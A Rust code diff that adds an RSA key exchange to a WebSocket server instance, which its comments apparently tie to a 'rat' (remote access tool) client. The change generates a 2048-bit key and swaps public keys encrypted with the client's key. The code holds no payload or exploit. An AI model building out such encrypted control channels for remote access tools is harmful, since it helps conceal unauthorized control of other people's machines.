@@ -4,7 +4,10 @@ use futures_util::{
     stream::{SplitSink, SplitStream},
     SinkExt, StreamExt,
 };
-use serde_json::to_string;
+use rsa::{
+    pkcs1::{DecodeRsaPublicKey, EncodeRsaPrivateKey, EncodeRsaPublicKey},
+    Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
+};
 use tokio_tungstenite::WebSocketStream;
 use tungstenite::Message;
 
@@ -15,8 +18,8 @@ pub struct Instance {
     write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
     read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
     hostname: String,
-    public_key: String,
-    private_key: String,
+    public_key: Option<RsaPublicKey>,
+    private_key: Option<RsaPrivateKey>,
     path: String,
 }
 impl Instance {
@@ -32,8 +35,8 @@ impl Instance {
             write,
             read,
             hostname,
-            public_key: "".to_string(),
-            private_key: "".to_string(),
+            public_key: None,
+            private_key: None,
             path,
         }
     }
@@ -42,8 +45,8 @@ impl Instance {
         write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
         read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
         hostname: String,
-        public_key: String,
-        private_key: String,
+        public_key: Option<RsaPublicKey>,
+        private_key: Option<RsaPrivateKey>,
         path: String,
     ) -> Instance {
         Instance {
@@ -65,25 +68,56 @@ impl Instance {
     pub fn get_path(&self) -> &str {
         &self.path
     }
+    pub fn set_public_key(&mut self, public_key: RsaPublicKey) {
+        self.public_key = Some(public_key);
+    }
+    pub fn set_private_key(&mut self, private_key: RsaPrivateKey) {
+        self.private_key = Some(private_key);
+    }
     pub async fn generate_keys(&mut self) -> (String, String) {
         //Send pong for rat to generate a public key
         self.write.send(Message::from("pong")).await.unwrap();
 
         let mut public_key = String::from("");
-        let mut private_key = String::from("");
-        if let Some(message) = self.read.next().await {
-            let my_public_key;
-            public_key = message.unwrap().to_string();
+        let mut private_key_string = String::from("");
+        if let Some(message) = &self.read.next().await {
+            public_key = message.as_ref().unwrap().to_string();
             //Generate private key and also assign it
-            (my_public_key, private_key) = self.generate_my_keys();
-            self.public_key = public_key.clone();
-            self.private_key = private_key.clone();
-            //make
-            self.write.send(Message::from(my_public_key)).await.unwrap();
+            let private_key = &self.generate_private_key();
+            private_key_string = private_key
+                .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
+                .unwrap()
+                .to_string();
+            //Get public key from what user sends us
+            self.set_public_key(RsaPublicKey::from_pkcs1_pem(public_key.as_str()).unwrap());
+            self.set_private_key(private_key.to_owned());
+
+            //Send my public key encrypted by users public key to user and forget about it
+            let encrypted_key = &self.encrypt(
+                &self.public_key.clone().unwrap(),
+                private_key
+                    .to_public_key()
+                    .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
+                    .unwrap()
+                    .into_bytes(),
+            );
+            self.write
+                .send(Message::from(encrypted_key[..].to_vec()))
+                .await
+                .unwrap();
         }
-        (public_key, private_key)
+
+        (public_key, private_key_string)
     }
-    fn generate_my_keys(&self) -> (String, String) {
-        ("public".to_string(), "private".to_string())
+    fn generate_private_key(&self) -> RsaPrivateKey {
+        let mut rng = rand::thread_rng();
+        let bits = 2048;
+        RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key")
+    }
+    fn encrypt(&self, public_key: &RsaPublicKey, data_to_enc: Vec<u8>) -> Vec<u8> {
+        let mut rng = rand::thread_rng();
+        public_key
+            .encrypt(&mut rng, Pkcs1v15Encrypt, &data_to_enc[..])
+            .expect("failed to encrypt")
     }
 }
